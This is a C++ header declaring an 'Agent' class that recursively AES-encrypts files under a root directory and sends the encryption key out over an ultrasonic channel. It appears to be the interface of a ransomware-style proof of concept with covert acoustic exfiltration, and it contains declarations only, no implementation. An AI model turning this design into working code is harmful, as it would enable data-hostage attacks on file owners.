#pragma once

#include "Ultrasonic.h"
#undef main

#include <array>
#include <filesystem>
#include <Cryptopp/aes.h>


class Agent final
{
public:
	// ctor
	Agent();

	// dtor
	~Agent();

	// Executes the agent logic.
	// param[in]	encryption_root_path	root path for the files encryption.
	void execute(const std::filesystem::path& encryption_root_path);

	// Deleted functions
	Agent(const Agent&) = delete;
	Agent(Agent&&) = delete;
	Agent& operator=(const Agent&) = delete;
	Agent& operator=(Agent&&) = delete;
	
private:

	// Encrypt the files in the directory recursively.
	// param[in]	encryption_root_path	root path for the files encryption.
	void encrypt_directory(const std::filesystem::path& encryption_root_path);

	// Generates aes key.
	// return								The aes key.
	static std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH> generate_key();

	// Generates aes initialization vector.
	// return								The aes initialization vector.
	static std::array<CryptoPP::byte, CryptoPP::AES::BLOCKSIZE> generate_iv();

	// The ultrasonic function for the main thread.
	void ultrasonic_main();

	// Sends the key by using the ultrasonic.
	void send_key();
	
	// Members
	std::mutex m_ultrasonic_mutex;
	ultrasonic::Ultrasonic m_ultrasonic;
	std::unique_ptr<std::jthread> m_ultrasonic_main_thread;
	std::unique_ptr<std::jthread> m_send_key_thread;
	bool m_agent_running = true;
	std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH> m_encryption_key;
	std::array<CryptoPP::byte, CryptoPP::AES::BLOCKSIZE> m_init_vector;
};
